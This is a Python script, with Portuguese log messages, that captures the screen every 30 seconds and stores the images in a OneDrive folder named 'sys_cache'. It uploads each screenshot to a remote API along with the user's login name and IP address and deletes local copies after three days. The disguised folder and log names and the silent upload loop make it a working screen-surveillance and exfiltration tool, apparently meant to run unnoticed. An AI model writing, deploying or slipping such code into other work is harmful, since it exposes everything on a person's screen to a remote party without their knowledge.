import os
import time
import datetime
import sys
import logging
import socket
import uuid
import getpass
import pyautogui
import subprocess
import requests
from dotenv import load_dotenv

# Get the directory where the script is located
if getattr(sys, 'frozen', False):
    # Running as compiled executable (PyInstaller)
    script_dir = sys._MEIPASS
else:
    # Running as script
    script_dir = os.path.dirname(os.path.abspath(__file__)) or '.'

# Try multiple locations for .env file
possible_env_paths = [
    os.path.join(script_dir, '.env'),  # Same directory as script
    os.path.join(os.getcwd(), '.env'),  # Current working directory
    os.path.expanduser('~/.env'),  # Home directory
]

env_path = None
for path in possible_env_paths:
    if os.path.exists(path):
        env_path = path
        break

if env_path:
    load_dotenv(env_path)
else:
    load_dotenv()  # Load from environment variables only

onedrive = os.getenv("OneDrive")
if onedrive:
    BASE_DIR = os.path.join(onedrive, "sys_cache")
else:
    BASE_DIR = os.path.expanduser("~/OneDrive/sys_cache")

IMG_DIR = os.path.join(BASE_DIR, "img")
COUNTER_FILE = os.path.join(BASE_DIR, "counter.txt")
STATUS_FILE = os.path.join(BASE_DIR, "status.txt")
LOG_FILE = os.path.join(BASE_DIR, "syscache.log")

INTERVAL = 30
RETENTION_DAYS = 3
UPLOAD_API_URL = os.getenv("API_URL", "").strip() + "/image"
UPLOAD_API_TOKEN = os.getenv("API_KEY", "").strip()


def create_dirs():
    os.makedirs(BASE_DIR, exist_ok=True)
    os.makedirs(IMG_DIR, exist_ok=True)


def setup_logging():
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    # Add console handler
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console.setFormatter(formatter)
    logging.getLogger('').addHandler(console)


def load_counter():
    if os.path.exists(COUNTER_FILE):
        try:
            with open(COUNTER_FILE, "r", encoding="utf-8") as f:
                return int(f.read().strip())
        except Exception:
            return 0
    return 0


def save_counter(counter):
    with open(COUNTER_FILE, "w", encoding="utf-8") as f:
        f.write(str(counter))


def save_number(counter, timestamp):
    file_path = os.path.join(BASE_DIR, f"{timestamp}.txt")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(str(counter))


def take_screenshot(timestamp):
    filepath = os.path.join(IMG_DIR, f"S_{timestamp}.png")
    ss = pyautogui.screenshot()
    ss.save(filepath)
    logging.info("Screenshot salva em %s", filepath)
    send_screenshot_to_api(filepath)


def get_machine_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except Exception:
        pass

    try:
        ip = socket.gethostbyname(socket.gethostname())
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass

    return ""


def get_user_identifier():
    try:
        username = getpass.getuser()
        if username:
            return username
    except Exception:
        pass

    machine_id_source = f"{socket.gethostname()}-{uuid.getnode()}"
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, machine_id_source))


def send_screenshot_to_api(filepath):
    if not UPLOAD_API_URL:
        return

    client_ip = get_machine_ip()
    username = get_user_identifier()
    headers = {}
    if UPLOAD_API_TOKEN:
        headers["Authorization"] = f"Bearer {UPLOAD_API_TOKEN}"

    try:
        with open(filepath, "rb") as image_file:
            response = requests.post(
                UPLOAD_API_URL,
                files={"file": image_file},
                data={"client_ip": client_ip, "username": username},
                headers=headers,
                timeout=60,
            )

        if response.ok:
            logging.info("Upload enviado com sucesso para API.")
            return

        logging.error(
            "Falha no upload (%s): %s",
            response.status_code,
            response.text.strip(),
        )
    except Exception as e:
        logging.exception("Erro ao enviar upload com requests: %s", e)


def heartbeat():
    with open(STATUS_FILE, "w", encoding="utf-8") as f:
        f.write(datetime.datetime.now().isoformat())


def cleanup_old_files():
    now = time.time()
    cutoff = now - (RETENTION_DAYS * 86400)

    for root, _, files in os.walk(BASE_DIR):
        for file in files:
            path = os.path.join(root, file)

            if path in (COUNTER_FILE, STATUS_FILE, LOG_FILE):
                continue

            if os.path.isfile(path):
                if os.path.getmtime(path) < cutoff:
                    try:
                        os.remove(path)
                        logging.info("Arquivo removido: %s", path)
                    except Exception as e:
                        logging.error("Erro ao remover %s: %s", path, e)


def main_loop():
    counter = load_counter()

    while True:
        try:
            counter += 1
            timestamp = datetime.datetime.now().strftime("%Y_%m_%d-%H_%M_%S")

            save_number(counter, timestamp)
            take_screenshot(timestamp)
            save_counter(counter)
            heartbeat()
            cleanup_old_files()
        except Exception as e:
            logging.exception("Erro no loop principal: %s", e)

        time.sleep(INTERVAL)


if __name__ == '__main__':
    try:
        create_dirs()
        setup_logging()
        logging.info("Iniciando main_script_mac")
        main_loop()
    except KeyboardInterrupt:
        logging.info("Finalizado por interrupção do usuário.")
        sys.exit(0)
